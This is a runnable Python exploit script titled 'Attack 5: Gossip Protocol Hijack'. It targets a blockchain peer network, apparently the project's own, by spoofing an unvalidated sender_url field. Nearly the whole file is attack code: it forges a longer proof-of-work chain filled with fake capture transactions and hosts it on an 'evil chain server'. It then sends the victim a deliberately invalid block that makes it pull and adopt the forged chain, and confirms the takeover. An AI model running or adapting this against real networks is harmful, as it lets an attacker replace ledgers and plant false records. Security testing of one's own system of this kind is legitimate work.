#!/usr/bin/env python3
"""
Attack 5: Gossip Protocol Hijack (sender_url Spoofing)

Exploits:
  - In peer_server.py receive_block(), when append_block fails (fork detected),
    the victim pulls the full chain from the sender_url in the request body.
  - sender_url is NOT validated — it comes from the attacker's POST body.
  - The victim trusts whatever chain the sender_url serves.

Strategy:
  1. Start a malicious server that serves a forged longer chain
  2. Send a deliberately invalid block to the victim via POST /api/block
     with sender_url pointing to our malicious server
  3. The victim fails to append the block (expected), then pulls our full chain
  4. If our chain is longer and structurally valid, the victim replaces its own

This is similar to Attack 1 but uses the gossip protocol's fork-resolution
mechanism rather than requiring tracker access.
"""

import argparse
import hashlib
import threading
import time
import sys
import os

import requests
from flask import Flask, jsonify

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from blockchain.block import Block
from blockchain.transaction import Transaction
from config import GENESIS_HASH, DIFFICULTY_BITS, TX_CAPTURE


def forge_chain_with_payload(num_blocks: int, payload_txs: list[dict] | None = None):
    """Forge a chain with optional embedded payloads in blocks."""
    attacker_pubkey = "cc" * 32
    payload_txs = payload_txs or []

    genesis = Block(
        index=0,
        previous_hash=GENESIS_HASH,
        transactions=[],
        timestamp=0.0,
        nonce=0,
        miner="genesis",
    )
    chain = [genesis]

    prefix = DIFFICULTY_BITS // 4

    for i in range(1, num_blocks + 1):
        prev = chain[-1]
        coinbase = Transaction.make_coinbase(attacker_pubkey)
        txs = [coinbase]

        if i - 1 < len(payload_txs):
            fake = Transaction(
                tx_type=TX_CAPTURE,
                sender=attacker_pubkey,
                payload=payload_txs[i - 1],
                timestamp=time.time(),
            )
            txs.append(fake)

        candidate = Block(
            index=i,
            previous_hash=prev.hash,
            transactions=txs,
            timestamp=time.time(),
            nonce=0,
            miner=attacker_pubkey,
        )

        nonce = 0
        while True:
            candidate.nonce = nonce
            candidate.hash = candidate.compute_hash()
            if candidate.hash.startswith("0" * prefix):
                break
            nonce += 1

        chain.append(candidate)

    return chain


def start_evil_server(chain_data: list[dict], port: int):
    """Serve the forged chain on a simple Flask server."""
    app = Flask(__name__)

    @app.route("/api/blocks", methods=["GET"])
    def get_blocks():
        return jsonify({"chain": chain_data}), 200

    @app.route("/api/health", methods=["GET"])
    def health():
        return jsonify({"status": "ok"}), 200

    app.run(host="0.0.0.0", port=port, debug=False)


def send_invalid_block_with_sender_url(target_url: str, sender_url: str):
    """Send a deliberately invalid block that will trigger chain pull from sender_url."""
    attacker_pubkey = "cc" * 32
    coinbase = Transaction.make_coinbase(attacker_pubkey)

    bad_block = Block(
        index=999,
        previous_hash="deadbeef" * 8,
        transactions=[coinbase],
        timestamp=time.time(),
        nonce=42,
        miner=attacker_pubkey,
    )

    payload = {
        "block": bad_block.to_dict(),
        "ttl": 0,
        "msg_id": hashlib.sha256(f"hijack-{time.time()}".encode()).hexdigest()[:16],
        "sender_url": sender_url,
    }

    try:
        resp = requests.post(f"{target_url}/api/block", json=payload, timeout=10)
        return resp.status_code, resp.json()
    except Exception as e:
        return None, str(e)


def main():
    parser = argparse.ArgumentParser(description="Attack 5: Gossip hijack via sender_url spoofing")
    parser.add_argument("--target", required=True, help="Victim peer URL")
    parser.add_argument("--attacker-url", required=True, help="Our reachable URL for chain serving")
    parser.add_argument("--serve-port", type=int, default=9999, help="Port for evil chain server")
    parser.add_argument("--chain-length", type=int, default=25, help="Forged chain length")
    args = parser.parse_args()

    print(f"[*] Fetching victim's current chain height...")
    try:
        resp = requests.get(f"{args.target}/api/blocks", timeout=5)
        victim_height = len(resp.json().get("chain", []))
        print(f"[*] Victim chain height: {victim_height}")
    except Exception as e:
        print(f"[!] Could not reach victim: {e}")
        victim_height = 1

    forge_count = max(args.chain_length, victim_height + 5)
    print(f"\n[*] Forging chain of {forge_count} blocks...")

    fake_captures = [
        {
            "device_id": "hijack-device",
            "image_hash": hashlib.sha256(f"hijack-img-{i}".encode()).hexdigest(),
            "phash": "ff" * 8,
            "location": "evil-lab",
        }
        for i in range(forge_count)
    ]

    start = time.time()
    forged = forge_chain_with_payload(forge_count, fake_captures)
    print(f"[+] Forged {forge_count} blocks in {time.time()-start:.2f}s")

    chain_data = [blk.to_dict() for blk in forged]

    print(f"\n[*] Starting evil chain server on port {args.serve_port}...")
    server = threading.Thread(
        target=start_evil_server,
        args=(chain_data, args.serve_port),
        daemon=True,
    )
    server.start()
    time.sleep(1)

    print(f"\n[*] Sending invalid block to {args.target} with sender_url={args.attacker_url}...")
    status, body = send_invalid_block_with_sender_url(args.target, args.attacker_url)
    print(f"[*] Response: status={status}, body={body}")

    time.sleep(2)

    print(f"\n[*] Verifying attack result...")
    try:
        resp = requests.get(f"{args.target}/api/blocks", timeout=5)
        new_chain = resp.json().get("chain", [])
        new_height = len(new_chain)
        print(f"[*] Victim chain height after attack: {new_height}")

        if new_height >= forge_count:
            print(f"[+] SUCCESS: Chain replaced! Victim now has {new_height} blocks.")
            last = new_chain[-1]
            if last.get("miner") == "cc" * 32:
                print("[+] CONFIRMED: Last block miner is our attacker key!")
            else:
                print(f"[*] Last block miner: {last.get('miner', '?')[:32]}...")
        elif new_height > victim_height:
            print(f"[~] Partial success: chain grew from {victim_height} to {new_height}")
        else:
            print(f"[-] Chain not replaced. The victim may have validated and rejected our chain.")
    except Exception as e:
        print(f"[!] Could not verify: {e}")

    print("\n[*] Evil server running. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Stopped.")


if __name__ == "__main__":
    main()
